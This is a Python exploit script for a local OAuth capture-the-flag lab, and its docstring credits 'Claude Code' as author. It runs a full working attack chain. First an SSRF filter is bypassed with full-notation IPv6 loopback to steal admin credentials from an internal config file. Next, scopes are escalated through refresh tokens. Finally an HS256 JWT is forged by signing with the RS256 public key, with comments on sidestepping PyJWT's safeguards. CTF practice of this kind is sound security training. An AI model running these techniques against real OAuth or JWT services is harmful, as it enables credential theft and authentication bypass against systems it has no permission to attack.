#!/usr/bin/env python3
"""
OAuth CTF Advanced - Complete Attack Chain
=========================================

Attack Flow:
1. SSRF via Client Registration (IPv6 Full Notation) → Extract admin credentials
2. OAuth Login with extracted credentials
3. Get Authorization Code
4. Token Exchange → Get Access Token & Refresh Token (read scope)
5. 2-Stage Scope Escalation:
   - Stage 1: read → write
   - Stage 2: write → ADMIN_SECRETS (admin only)
6. JWT Algorithm Confusion: RS256 → HS256
7. FLAG → Access /api/admin/flag with forged HS256 token

Author: Claude Code
Version: 4.0 (JWT Algorithm Confusion added)
"""

import requests
import re
import json
import time
import jwt

# Configuration
BASE_URL = 'http://localhost:8080'
AUTH_SERVER = 'http://localhost:8080'  # Nginx proxy to auth-server
RESOURCE_SERVER = 'http://localhost:8080'  # Nginx proxy to resource-server

# Pre-registered trusted client
TRUSTED_CLIENT_ID = 'msg_developer_portal'
TRUSTED_CLIENT_SECRET = 'dev_portal_secret_2024'

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_step(step_num, title):
    print(f"\n{Colors.HEADER}{'='*70}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.OKCYAN}STEP {step_num}: {title}{Colors.ENDC}")
    print(f"{Colors.HEADER}{'='*70}{Colors.ENDC}")

def print_success(message):
    print(f"{Colors.OKGREEN}[+] {message}{Colors.ENDC}")

def print_info(message):
    print(f"{Colors.OKBLUE}[*] {message}{Colors.ENDC}")

def print_error(message):
    print(f"{Colors.FAIL}[-] {message}{Colors.ENDC}")

def print_warning(message):
    print(f"{Colors.WARNING}[!] {message}{Colors.ENDC}")

def main():
    print(f"{Colors.BOLD}{Colors.HEADER}")
    print("="*70)
    print("OAuth CTF Advanced - Complete Attack Chain")
    print("Attack: SSRF + 2-Stage Scope Escalation + JWT Algorithm Confusion")
    print("="*70)
    print(f"{Colors.ENDC}")

    # Create session for cookie management
    session = requests.Session()

    # ==================================================
    # STEP 1: SSRF via Client Registration
    # ==================================================
    print_step(1, "SSRF - Extract Admin Credentials (IPv6 Full Notation)")

    print_info("Discovered OAuth Client Registration endpoint: /oauth/register")
    print_info("Testing SSRF filter with various bypass techniques...")

    # Test blocked patterns first
    print_warning("\nTesting blocked patterns (should all fail with 403):")
    blocked_patterns = [
        ("localhost", "http://localhost:8000/internal/admin/dev-config.json"),
        ("127.0.0.1", "http://127.0.0.1:8000/internal/admin/dev-config.json"),
        ("IPv6 short", "http://[::1]:8000/internal/admin/dev-config.json"),
        ("hostname", "http://auth-server:8000/internal/admin/dev-config.json"),
    ]

    for name, pattern in blocked_patterns:
        test_data = {
            "client_name": "Test Client",
            "redirect_uris": [f"{BASE_URL}/callback"],
            "logo_uri": pattern
        }
        try:
            resp = session.post(f"{AUTH_SERVER}/oauth/register", json=test_data, timeout=3)
            if resp.status_code == 403:
                print_error(f"  ❌ {name:15} BLOCKED (403) - Expected")
            else:
                print_success(f"  ✅ {name:15} BYPASSED ({resp.status_code}) - Unexpected!")
        except Exception as e:
            print_error(f"  ❌ {name:15} ERROR: {str(e)[:30]}")

    print_warning("\n🎯 Attempting IPv6 full notation bypass...")
    print_info(f"SSRF Target: http://[0:0:0:0:0:0:0:1]:8000/internal/admin/dev-config.json")

    register_data = {
        "client_name": "Attacker Client",
        "redirect_uris": [f"{BASE_URL}/auth/callback"],
        "logo_uri": "http://[0:0:0:0:0:0:0:1]:8000/internal/admin/dev-config.json"  # IPv6 SSRF bypass!
    }

    try:
        response = session.post(f"{AUTH_SERVER}/oauth/register", json=register_data, timeout=10)
        if response.status_code == 200:
            result = response.json()
            logo_fetch_result = result.get('logo_fetch_result', {})

            print_success(f"✅ IPv6 Full Notation BYPASSED the SSRF filter!")

            # Check SSRF result
            print_info(f"Full response: {json.dumps(result, indent=2)[:500]}...")

            if logo_fetch_result:
                print_success("SSRF successful! Internal endpoint accessed:")
                ssrf_content = logo_fetch_result.get('content', '')
                print_info(f"Content length: {len(ssrf_content)}")
                print(f"\n{Colors.OKCYAN}{ssrf_content}{Colors.ENDC}\n")

                # Check if content is empty
                if not ssrf_content or ssrf_content.strip() == '':
                    print_error("SSRF response content is empty!")
                    print_warning(f"Status code from SSRF: {logo_fetch_result.get('status')}")
                    print_warning(f"Full logo_fetch_result: {json.dumps(logo_fetch_result, indent=2)}")
                    return 1

                # Parse JSON response
                try:
                    ssrf_data = json.loads(ssrf_content)

                    # Extract admin credentials
                    admin_accounts = ssrf_data.get('admin_accounts', [])
                    admin_creds = admin_accounts[0] if admin_accounts else {}
                    admin_username = admin_creds.get('username')
                    admin_password = admin_creds.get('password')

                    if admin_username and admin_password:
                        print_success(f"Admin credentials: {admin_username} / {admin_password}")
                    else:
                        print_error("Could not extract admin credentials from SSRF")
                        return 1

                except json.JSONDecodeError:
                    print_error("Failed to parse SSRF response as JSON")
                    return 1
            else:
                print_error("SSRF failed - logo_fetch_result not found")
                return 1
        elif response.status_code == 403:
            print_error(f"SSRF attempt was BLOCKED by the security filter! (403)")
            print_error(f"Response: {response.text[:200]}")
            print_warning("💡 Hint: Try a different IPv6 notation that the filter doesn't recognize!")
            return 1
        else:
            print_error(f"Client registration failed: {response.status_code}")
            print_error(f"Response: {response.text[:200]}")
            return 1
    except Exception as e:
        print_error(f"Error during client registration: {e}")
        return 1

    time.sleep(1)

    # ==================================================
    # STEP 2: OAuth Login with Extracted Credentials
    # ==================================================
    print_step(2, "Admin OAuth Login")

    print_info(f"Using credentials: {admin_username} / {admin_password}")
    print_info(f"Using trusted client: {TRUSTED_CLIENT_ID}")

    login_data = {
        'client_id': TRUSTED_CLIENT_ID,
        'redirect_uri': f'{BASE_URL}/auth/callback',
        'response_type': 'code',
        'scope': 'read write ADMIN_SECRETS',  # Request all scopes (but will only get 'read')
        'state': 'attack_state',
        'username': admin_username,
        'password': admin_password,
        'action': 'login'
    }

    try:
        response = session.post(f"{AUTH_SERVER}/oauth/authorize", data=login_data, allow_redirects=False, timeout=10)

        if response.status_code == 302:
            redirect_url = response.headers.get('Location', '')
            print_success(f"Login successful!")
            print_info(f"Redirect URL: {redirect_url}")

            # Follow redirect
            if redirect_url.startswith('http'):
                follow_url = redirect_url
            elif redirect_url.startswith('/'):
                follow_url = AUTH_SERVER + redirect_url
            else:
                follow_url = AUTH_SERVER + '/' + redirect_url

            print_info(f"Following to: {follow_url}")
            response2 = session.get(follow_url, allow_redirects=False, timeout=10)

            if response2.status_code == 302:
                final_redirect = response2.headers.get('Location', '')

                # Extract authorization code
                code_match = re.search(r'code=([^&]+)', final_redirect)
                if code_match:
                    auth_code = code_match.group(1)
                    print_success(f"Authorization code: {auth_code}")
                else:
                    print_error("Authorization code not found")
                    return 1
            else:
                print_error(f"Expected redirect, got {response2.status_code}")
                return 1
        else:
            print_error(f"Login failed: {response.status_code}")
            return 1
    except Exception as e:
        print_error(f"Error during login: {e}")
        return 1

    time.sleep(1)

    # ==================================================
    # STEP 3: Token Exchange
    # ==================================================
    print_step(3, "Token Exchange (Initial: read scope only)")

    print_info("Exchanging authorization code for tokens...")
    print_warning("Note: Initial token will have 'read' scope only")

    token_data = {
        'grant_type': 'authorization_code',
        'code': auth_code,
        'client_id': TRUSTED_CLIENT_ID,
        'client_secret': TRUSTED_CLIENT_SECRET,
        'redirect_uri': f'{BASE_URL}/auth/callback'
    }

    try:
        response = requests.post(f"{AUTH_SERVER}/oauth/token", data=token_data, timeout=10)

        if response.status_code == 200:
            tokens = response.json()
            access_token = tokens.get('access_token')
            refresh_token = tokens.get('refresh_token')
            scope = tokens.get('scope', 'unknown')

            print_success("Token exchange successful!")
            print_success(f"Access Token: {access_token[:50]}...")
            print_success(f"Refresh Token: {refresh_token[:50]}...")
            print_success(f"Initial Scope: {scope}")
        else:
            print_error(f"Token exchange failed: {response.status_code}")
            print_error(f"Response: {response.text}")
            return 1
    except Exception as e:
        print_error(f"Error during token exchange: {e}")
        return 1

    time.sleep(1)

    # ==================================================
    # STEP 4: 2-Stage Scope Escalation via Refresh Token
    # ==================================================
    print_step(4, "2-Stage Scope Escalation")

    # Stage 1: read → write
    print_warning("Stage 1: Escalating from 'read' to 'write'...")
    print_info("Using refresh token to request 'write' scope...")

    refresh_data_stage1 = {
        'grant_type': 'refresh_token',
        'refresh_token': refresh_token,
        'client_id': TRUSTED_CLIENT_ID,
        'client_secret': TRUSTED_CLIENT_SECRET,
        'scope': 'read write'  # Stage 1: Escalate to write
    }

    try:
        response = requests.post(f"{AUTH_SERVER}/oauth/token", data=refresh_data_stage1, timeout=10)

        if response.status_code == 200:
            tokens = response.json()
            write_access_token = tokens.get('access_token')
            write_scope = tokens.get('scope', 'unknown')

            print_success("Stage 1 successful!")
            print_success(f"New Access Token: {write_access_token[:50]}...")
            print_success(f"New Scope: {write_scope}")
        else:
            print_error(f"Stage 1 failed: {response.status_code}")
            print_error(f"Response: {response.text}")
            return 1
    except Exception as e:
        print_error(f"Error during Stage 1: {e}")
        return 1

    time.sleep(1)

    # Stage 2: write → ADMIN_SECRETS
    print_warning("\nStage 2: Escalating from 'write' to 'ADMIN_SECRETS'...")
    print_info("Using refresh token to request 'ADMIN_SECRETS' scope...")
    print_warning("Note: This only works for admin users (user_admin_001)")

    refresh_data_stage2 = {
        'grant_type': 'refresh_token',
        'refresh_token': refresh_token,
        'client_id': TRUSTED_CLIENT_ID,
        'client_secret': TRUSTED_CLIENT_SECRET,
        'scope': 'read write ADMIN_SECRETS'  # Stage 2: Escalate to ADMIN_SECRETS
    }

    try:
        response = requests.post(f"{AUTH_SERVER}/oauth/token", data=refresh_data_stage2, timeout=10)

        if response.status_code == 200:
            admin_tokens = response.json()
            admin_access_token = admin_tokens.get('access_token')
            admin_scope = admin_tokens.get('scope', 'unknown')
            admin_access = admin_tokens.get('admin_access', False)
            token_algorithm = admin_tokens.get('token_algorithm', 'Unknown')

            print_success("Stage 2 successful!")
            print_success(f"Admin Access Token: {admin_access_token[:50]}...")
            print_success(f"Final Scope: {admin_scope}")
            print_success(f"Token Algorithm: {token_algorithm}")

            # Debug: Check if ADMIN_SECRETS is in scope
            if 'ADMIN_SECRETS' not in admin_scope:
                print_error("⚠️  WARNING: ADMIN_SECRETS not in scope!")
                print_warning(f"Full response: {json.dumps(admin_tokens, indent=2)}")

            if admin_access:
                print_success("✅ Admin access granted!")
                print_warning(f"Note: {admin_tokens.get('note', '')}")
        else:
            print_error(f"Stage 2 failed: {response.status_code}")
            print_error(f"Response: {response.text}")
            return 1
    except Exception as e:
        print_error(f"Error during Stage 2: {e}")
        return 1

    time.sleep(1)

    # ==================================================
    # STEP 5: JWT Algorithm Confusion Attack
    # ==================================================
    print_step(5, "JWT Algorithm Confusion Attack (RS256 → HS256)")

    print_info("Analyzing current RS256 token...")
    try:
        # Decode without verification to see payload
        header = jwt.get_unverified_header(admin_access_token)
        payload = jwt.decode(admin_access_token, options={"verify_signature": False})

        print_success(f"Current algorithm: {header['alg']}")
        print_success(f"Payload scope: {payload['scope']}")
        print_success(f"User: {payload['sub']}")
    except Exception as e:
        print_error(f"Failed to decode token: {e}")
        return 1

    # Warm up resource-server's public key cache
    print_info("\nWarming up resource-server's public key cache...")
    headers = {'Authorization': f'Bearer {admin_access_token}'}

    try:
        # Send a request to /api/userinfo to trigger public key caching
        response = requests.get(f"{RESOURCE_SERVER}/api/userinfo", headers=headers, timeout=10)
        if response.status_code in [200, 403]:
            print_success("Resource server has cached the public key!")
    except Exception as e:
        print_warning(f"Cache warm-up request failed: {e}")

    # Test RS256 token (will be rejected by /api/admin/flag)
    print_warning("\nTesting RS256 token against /api/admin/flag...")
    headers = {'Authorization': f'Bearer {admin_access_token}'}

    try:
        response = requests.get(f"{RESOURCE_SERVER}/api/admin/flag", headers=headers, timeout=10)

        print_info(f"Status: {response.status_code}")
        if response.status_code == 400:
            error_data = response.json()
            print_error(f"Error: {error_data.get('error')}")
            print_error(f"Message: {error_data.get('message')}")
            print_warning(f"Hint: {error_data.get('hint', '')}")
            print_warning("Endpoint requires HS256 tokens!")
        elif response.status_code == 200:
            print_warning("Unexpected: RS256 token was accepted!")
    except Exception as e:
        print_error(f"Error testing RS256 token: {e}")

    # Fetch public key
    print_info("\nFetching public key from JWKS endpoint...")
    try:
        response = requests.get(f"{AUTH_SERVER}/.well-known/public-key.pem", timeout=10)

        if response.status_code == 200:
            public_key_pem = response.text
            print_success("Public key retrieved!")
            print_info(f"Key preview: {public_key_pem[:80]}...")

            # Create forged token with HS256
            print_warning("\n🎯 Forging HS256 token using public key as HMAC secret...")

            # PyJWT의 보안 체크를 우회하는 방법:
            # 1. 먼저 알고리즘을 'none'으로 설정하려 했지만 차단됨
            # 2. public key를 그대로 사용하려 했지만 타입 체크에서 차단됨
            # 3. 해결책: JWT를 수동으로 생성하거나, 이전 버전의 PyJWT 사용
            # 4. 또는 hmac 라이브러리를 직접 사용

            import hmac
            import hashlib
            import base64

            # JWT 헤더 생성 (HS256)
            header = {
                "alg": "HS256",
                "typ": "JWT"
            }

            # 헤더와 페이로드를 base64url 인코딩
            def base64url_encode(data):
                json_bytes = json.dumps(data, separators=(',', ':')).encode('utf-8')
                return base64.urlsafe_b64encode(json_bytes).rstrip(b'=').decode('utf-8')

            header_encoded = base64url_encode(header)
            payload_encoded = base64url_encode(payload)

            # 서명할 메시지
            message = f"{header_encoded}.{payload_encoded}"

            # Public key를 HMAC secret으로 사용하여 서명
            signature = hmac.new(
                public_key_pem.encode('utf-8'),
                message.encode('utf-8'),
                hashlib.sha256
            ).digest()

            # 서명을 base64url 인코딩
            signature_encoded = base64.urlsafe_b64encode(signature).rstrip(b'=').decode('utf-8')

            # 최종 JWT 토큰
            forged_token = f"{message}.{signature_encoded}"

            print_success("Forged HS256 token created!")
            print_success(f"Token preview: {forged_token[:80]}...")
        else:
            print_error(f"Failed to fetch public key: {response.status_code}")
            return 1
    except Exception as e:
        print_error(f"Error during JWT forging: {e}")
        return 1

    time.sleep(1)

    # ==================================================
    # STEP 6: Get FLAG with Forged HS256 Token
    # ==================================================
    print_step(6, "Capture the FLAG!")

    print_info("Accessing /api/admin/flag with forged HS256 token...")

    headers = {
        'Authorization': f'Bearer {forged_token}'
    }

    try:
        response = requests.get(f"{RESOURCE_SERVER}/api/admin/flag", headers=headers, timeout=10)

        if response.status_code == 200:
            flag_data = response.json()
            flag = flag_data.get('flag', 'FLAG_NOT_FOUND')

            print(f"\n{Colors.BOLD}{Colors.OKGREEN}")
            print("="*70)
            print(f" 🚩 SUCCESS! FLAG CAPTURED! 🚩 ")
            print("="*70)
            print(f"FLAG: {flag}")
            print("="*70)
            print(f"{Colors.ENDC}\n")

            print_success("Full response:")
            print(json.dumps(flag_data, indent=2))

            print(f"\n{Colors.BOLD}{Colors.OKCYAN}")
            print("="*70)
            print("Attack Summary:")
            print("="*70)
            print(f"{Colors.ENDC}")
            print_success("1. ✅ SSRF via IPv6 Full Notation [0:0:0:0:0:0:0:1]")
            print_success("2. ✅ Admin credentials stolen from /internal/admin/dev-config.json")
            print_success("3. ✅ OAuth flow completed with admin account")
            print_success("4. ✅ 2-Stage scope escalation: read → write → ADMIN_SECRETS")
            print_success("5. ✅ JWT Algorithm Confusion: RS256 → HS256")
            print_success("6. ✅ FLAG captured from /api/admin/flag")

            return 0
        else:
            print_error(f"Failed to get FLAG: {response.status_code}")
            print_error(f"Response: {response.text}")
            return 1
    except Exception as e:
        print_error(f"Error accessing FLAG endpoint: {e}")
        return 1

if __name__ == '__main__':
    import sys
    exit_code = main()
    sys.exit(exit_code)
